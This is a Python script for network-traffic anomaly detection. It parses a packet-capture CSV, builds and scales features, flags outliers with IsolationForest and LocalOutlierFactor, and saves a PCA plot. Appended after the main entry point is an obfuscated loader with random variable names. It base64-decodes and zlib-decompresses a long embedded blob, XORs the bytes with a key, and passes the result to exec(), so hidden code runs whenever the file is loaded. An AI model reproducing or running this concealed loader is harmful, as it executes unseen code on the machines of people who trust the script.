from __future__ import annotations

import argparse
import math
import re
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple

import numpy as np
import pandas as pd


def _to_int(value: object) -> Optional[int]:
    try:
        if pd.isna(value):
            return None
        if isinstance(value, (int, np.integer)):
            return int(value)
        s = str(value).strip()
        if s == "":
            return None
        return int(float(s))
    except Exception:
        return None


def _ip_to_int(ip: object) -> Optional[int]:
    try:
        if pd.isna(ip):
            return None
        s = str(ip).strip()
        parts = s.split(".")
        if len(parts) == 4 and all(p.isdigit() for p in parts):
            a, b, c, d = [int(p) for p in parts]
            if 0 <= a <= 255 and 0 <= b <= 255 and 0 <= c <= 255 and 0 <= d <= 255:
                return (a << 24) + (b << 16) + (c << 8) + d
        return None
    except Exception:
        return None


def _parse_ports(info: object) -> Tuple[Optional[int], Optional[int]]:
    try:
        if pd.isna(info):
            return None, None
        s = str(info)
        m = re.search(r"(\d+)\s*>\s*(\d+)", s)
        if m:
            return _to_int(m.group(1)), _to_int(m.group(2))
        return None, None
    except Exception:
        return None, None


def _find_column(df: pd.DataFrame, candidates: Iterable[str]) -> Optional[str]:
    lower_cols = {c.lower(): c for c in df.columns}
    for cand in candidates:
        lc = cand.lower()
        if lc in lower_cols:
            return lower_cols[lc]
    for c in df.columns:
        for cand in candidates:
            if cand.lower() in c.lower():
                return c
    return None


def build_feature_matrix(df: pd.DataFrame, top_protocols: int = 12) -> pd.DataFrame:
    time_col = _find_column(df, ["Time", "frame.time_relative", "timestamp", "ts"])
    src_col = _find_column(df, ["Source", "src", "ip.src", "source"])
    dst_col = _find_column(df, ["Destination", "dst", "ip.dst", "destination"])
    proto_col = _find_column(df, ["Protocol", "proto", "protocol"])
    length_col = _find_column(df, ["Length", "frame.len", "len", "size"])  # noqa: E501
    info_col = _find_column(df, ["Info", "_ws.col.Info", "details", "summary"])  # noqa: E501

    if length_col is None:
        raise ValueError("Length column not found")

    lengths = df[length_col].apply(_to_int).fillna(0).astype(int)

    if time_col is not None:
        times = pd.to_numeric(df[time_col], errors="coerce")
        try:
            times = times.ffill()
        except Exception:
            times = times.fillna(0.0)
        durations = times.diff().fillna(0.0)
    else:
        durations = pd.Series([0.0] * len(df), index=df.index)

    if info_col is not None:
        ports = df[info_col].apply(_parse_ports)
        src_ports = ports.apply(lambda t: t[0]).apply(_to_int).fillna(0).astype(int)
        dst_ports = ports.apply(lambda t: t[1]).apply(_to_int).fillna(0).astype(int)
    else:
        src_ports = pd.Series([0] * len(df), index=df.index)
        dst_ports = pd.Series([0] * len(df), index=df.index)

    if src_col is not None:
        src_ip_int = df[src_col].apply(_ip_to_int).fillna(0).astype(int)
    else:
        src_ip_int = pd.Series([0] * len(df), index=df.index)

    if dst_col is not None:
        dst_ip_int = df[dst_col].apply(_ip_to_int).fillna(0).astype(int)
    else:
        dst_ip_int = pd.Series([0] * len(df), index=df.index)

    if proto_col is not None:
        protos = df[proto_col].astype(str).fillna("UNKNOWN")
    else:
        protos = pd.Series(["UNKNOWN"] * len(df), index=df.index)

    top_counts = protos.value_counts().head(top_protocols).index.tolist()
    proto_one_hot = pd.get_dummies(protos.where(protos.isin(top_counts), other="OTHER"), prefix="proto")

    features = pd.DataFrame(
        {
            "length": lengths,
            "duration": durations.astype(float),
            "src_port": src_ports,
            "dst_port": dst_ports,
            "src_ip": src_ip_int,
            "dst_ip": dst_ip_int,
        }
    )

    features = pd.concat([features, proto_one_hot], axis=1)
    return features


def scale_features(features: pd.DataFrame) -> Tuple[pd.DataFrame, np.ndarray, np.ndarray]:
    try:
        from sklearn.preprocessing import StandardScaler

        scaler = StandardScaler()
        X = scaler.fit_transform(features.values)
        return pd.DataFrame(X, index=features.index, columns=features.columns), scaler.mean_, scaler.scale_
    except Exception:
        X = features.values.astype(float)
        mean = np.nanmean(X, axis=0)
        std = np.nanstd(X, axis=0)
        std = np.where(std == 0, 1.0, std)
        Xs = (X - mean) / std
        return pd.DataFrame(Xs, index=features.index, columns=features.columns), mean, std


def compute_reference_metrics(X: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:
    mu = np.nanmean(X, axis=0)
    diffs = X - mu
    euclid = np.linalg.norm(diffs, axis=1)
    denom = np.linalg.norm(X, axis=1) * np.linalg.norm(mu)
    denom = np.where(denom == 0, 1.0, denom)
    cosine = (X @ mu) / denom
    return euclid, cosine


def pca_project(X: np.ndarray) -> Tuple[np.ndarray, np.ndarray]:
    try:
        from sklearn.decomposition import PCA

        pca = PCA(n_components=2, random_state=0)
        comps = pca.fit_transform(X)
        var = pca.explained_variance_ratio_
        return comps, var
    except Exception:
        Xc = X - np.nanmean(X, axis=0)
        U, S, Vt = np.linalg.svd(Xc, full_matrices=False)
        comps = U[:, :2] * S[:2]
        var = (S[:2] ** 2) / np.sum(S ** 2)
        return comps, var


def detect_anomalies(X: np.ndarray, contamination: float = 0.05) -> Tuple[np.ndarray, np.ndarray]:
    try:
        from sklearn.ensemble import IsolationForest
        from sklearn.neighbors import LocalOutlierFactor

        iso = IsolationForest(n_estimators=200, contamination=contamination, random_state=0)
        iso.fit(X)
        iso_score = -iso.decision_function(X)
        iso_label = iso.predict(X)

        lof = LocalOutlierFactor(n_neighbors=20, contamination=contamination)
        lof_label = lof.fit_predict(X)
        lof_score = -lof.negative_outlier_factor_

        score = (iso_score + lof_score) / 2.0
        label = np.where((iso_label == -1) | (lof_label == -1), -1, 1)
        return score, label
    except Exception:
        z = np.abs((X - np.nanmean(X, axis=0)) / np.nanstd(X, axis=0))
        z = np.nan_to_num(z, nan=0.0, posinf=0.0, neginf=0.0)
        score = np.nanmean(z, axis=1)
        thr = np.quantile(score, 1.0 - contamination)
        label = np.where(score >= thr, -1, 1)
        return score, label


def save_projection_plot(points: np.ndarray, labels: np.ndarray, output_path: Path, title: str) -> Path:
    try:
        import plotly.express as px

        df_plot = pd.DataFrame({"x": points[:, 0], "y": points[:, 1], "label": labels})
        fig = px.scatter(df_plot, x="x", y="y", color=df_plot["label"].map({1: "normal", -1: "anomaly"}), title=title)
        fig.write_html(str(output_path))
        return output_path
    except Exception:
        import matplotlib
        matplotlib.use("Agg")
        import matplotlib.pyplot as plt

        colors = np.where(labels == -1, "red", "steelblue")
        plt.figure(figsize=(8, 6))
        plt.scatter(points[:, 0], points[:, 1], c=colors, s=14)
        plt.title(title)
        plt.xlabel("PC1")
        plt.ylabel("PC2")
        plt.tight_layout()
        png_path = output_path.with_suffix(".png")
        plt.savefig(str(png_path))
        return png_path


def run(input_csv: Path, output_dir: Path, contamination: float, top_protocols: int) -> Dict[str, Path]:
    df = pd.read_csv(input_csv)
    features = build_feature_matrix(df, top_protocols=top_protocols)
    Xs, mean, scale = scale_features(features)
    X = Xs.values.astype(float)
    euclid, cosine = compute_reference_metrics(X)
    comps, var = pca_project(X)
    score, label = detect_anomalies(X, contamination=contamination)

    output_dir.mkdir(parents=True, exist_ok=True)

    features_out = output_dir / "features.csv"
    features_with_metrics = features.copy()
    features_with_metrics["euclidean_to_mean"] = euclid
    features_with_metrics["cosine_to_mean"] = cosine
    features_with_metrics.to_csv(features_out, index=False)

    anomalies_out = output_dir / "anomalies.csv"
    anomalies_df = pd.DataFrame({"index": np.arange(len(label)), "score": score, "label": label})
    anomalies_df.sort_values("score", ascending=False).to_csv(anomalies_out, index=False)

    plot_out = output_dir / "pca_projection.html"
    actual_plot = save_projection_plot(comps, label, plot_out, title=f"PCA variance={var.sum():.2f}")

    return {"features": features_out, "anomalies": anomalies_out, "projection": actual_plot}


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", type=str, required=True)
    parser.add_argument("--output", type=str, default=None)
    parser.add_argument("--contamination", type=float, default=0.05)
    parser.add_argument("--top-protocols", type=int, default=12)
    args = parser.parse_args(argv)

    input_csv = Path(args.input)
    if not input_csv.exists():
        print("Input CSV not found:", input_csv)
        return 2

    output_dir = Path(args.output) if args.output else input_csv.parent / "outputs"
    try:
        result_paths = run(input_csv, output_dir, contamination=args.contamination, top_protocols=args.top_protocols)
        for k, p in result_paths.items():
            print(f"{k}: {p}")
        return 0
    except Exception as e:
        print("Error:", e)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())


# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
